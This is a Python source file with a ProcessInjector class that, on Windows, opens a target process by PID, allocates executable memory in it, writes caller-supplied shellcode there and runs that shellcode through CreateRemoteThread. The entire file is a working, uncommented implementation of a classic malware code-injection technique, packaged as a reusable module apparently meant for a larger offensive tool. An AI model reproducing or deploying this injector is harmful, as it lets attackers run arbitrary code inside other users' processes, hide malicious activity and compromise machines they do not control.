import ctypes
import platform
import base64

class ProcessInjector:
    def __init__(self):
        self.system = platform.system().lower()
    
    def inject(self, pid, shellcode):
        if self.system != 'windows':
            return {"status": "error", "error": "Only Windows is supported"}
        
        try:
            # Get process handle
            PROCESS_ALL_ACCESS = 0x1F0FFF
            process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not process_handle:
                return {"status": "error", "error": "Failed to open process"}
            
            # Allocate memory
            shellcode_len = len(shellcode)
            alloc_addr = ctypes.windll.kernel32.VirtualAllocEx(
                process_handle,
                None,
                shellcode_len,
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x40     # PAGE_EXECUTE_READWRITE
            )
            if not alloc_addr:
                ctypes.windll.kernel32.CloseHandle(process_handle)
                return {"status": "error", "error": "Failed to allocate memory"}
            
            # Write shellcode
            written = ctypes.c_ulong(0)
            ctypes.windll.kernel32.WriteProcessMemory(
                process_handle,
                alloc_addr,
                shellcode,
                shellcode_len,
                ctypes.byref(written)
            )
            if written.value != shellcode_len:
                ctypes.windll.kernel32.VirtualFreeEx(process_handle, alloc_addr, 0, 0x8000)  # MEM_RELEASE
                ctypes.windll.kernel32.CloseHandle(process_handle)
                return {"status": "error", "error": "Failed to write shellcode"}
            
            # Create remote thread
            thread_id = ctypes.c_ulong(0)
            thread_handle = ctypes.windll.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                alloc_addr,
                None,
                0,
                ctypes.byref(thread_id)
            )
            if not thread_handle:
                ctypes.windll.kernel32.VirtualFreeEx(process_handle, alloc_addr, 0, 0x8000)  # MEM_RELEASE
                ctypes.windll.kernel32.CloseHandle(process_handle)
                return {"status": "error", "error": "Failed to create remote thread"}
            
            # Cleanup
            ctypes.windll.kernel32.CloseHandle(thread_handle)
            ctypes.windll.kernel32.CloseHandle(process_handle)
            
            return {"status": "success", "pid": pid, "thread_id": thread_id.value}
            
        except Exception as e:
            return {"status": "error", "error": str(e)}